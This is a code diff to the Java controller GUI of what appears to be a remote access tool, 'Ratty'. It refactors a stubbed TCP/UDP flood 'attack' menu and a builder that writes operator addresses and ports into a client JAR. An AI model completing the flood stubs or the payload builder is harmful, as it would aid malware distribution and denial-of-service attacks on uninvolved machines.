@@ -474,7 +474,25 @@ public final class RattyGuiController extends AbstractRattyController implements
 		client.connection.addPacket(packet);
 	}
 	
+	private void launchAttack() {
+		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, CANCEL);
+		
+		AttackPacket packet = null;
+		
+		if (input == JOptionPane.YES_OPTION) {
+			//TCP flood packet
+		} else if (input == JOptionPane.NO_OPTION) {
+			//UDP flood packet
+		}
+		
+		broadcast(packet);
+	}
+	
 	private void build() {
+		if (selectedBuilderFile == null) {
+			return;
+		}
+		
 		final String[] entries = builder.getListEntries();
 		final String dataReplacementString = Stream.of(entries).collect(Collectors.joining("\r\n"));
 		final byte[] dataReplacement = dataReplacementString.getBytes();
@@ -496,26 +514,31 @@ public final class RattyGuiController extends AbstractRattyController implements
 		}
 	}
 	
-	private void launchAttack() {
-		final int input = gui.showOptions(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, CANCEL);
+	private void selectBuilderFile() {
+		selectedBuilderFile = getSaveFile("JAR");
 		
-		AttackPacket packet = null;
-		
-		if (input == JOptionPane.YES_OPTION) {
-			//TCP flood packet
-		} else if (input == JOptionPane.NO_OPTION) {
-			//UDP flood packet
+		if (selectedBuilderFile != null) {
+			final String name = selectedBuilderFile.getName();
+			
+			builder.setFileName(name);
+		} else {
+			builder.setFileName(BuilderGui.NO_FILE);
 		}
-		
-		broadcast(packet);
 	}
 	
 	private void addBuilderEntry() {
 		final String address = builder.getAddressInput();
 		final String port = builder.getPortInput();
+		
+		if (address == null || port == null || address.isEmpty() || port.isEmpty()) {
+			return;
+		}
+		
 		final String entry = String.format(BUILDER_DATA_REPLACEMENT_FORMAT, address, port);
 		
 		builder.addListEntry(entry);
+		builder.setAddressInput("");
+		builder.setPortInput("");
 	}
 	
 	private void removeBuilderEntry() {
@@ -546,7 +569,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		} else if (command == RattyGui.BUILD) {
 			builder.setVisible(true);
 		} else if (command == BuilderGui.CHOOSE) {
-			selectedBuilderFile = getSaveFile("JAR");
+			selectBuilderFile();
 		} else if (command == BuilderGui.BUILD) {
 			build();
 		} else if (command == RattyGui.ATTACK) {
@@ -791,7 +814,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 			final ImageIcon icon = new ImageIcon(image);
 			
 			return icon;
-		} catch (final IOException ex) {
+		} catch (final Exception ex) {
 			return null;
 		}
 	}
@@ -872,6 +895,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 	@Override
 	public void closed(final ActiveServer server) {
 		super.closed(server);
+		
+		builder.close();
 		
 		System.exit(0);
 	}
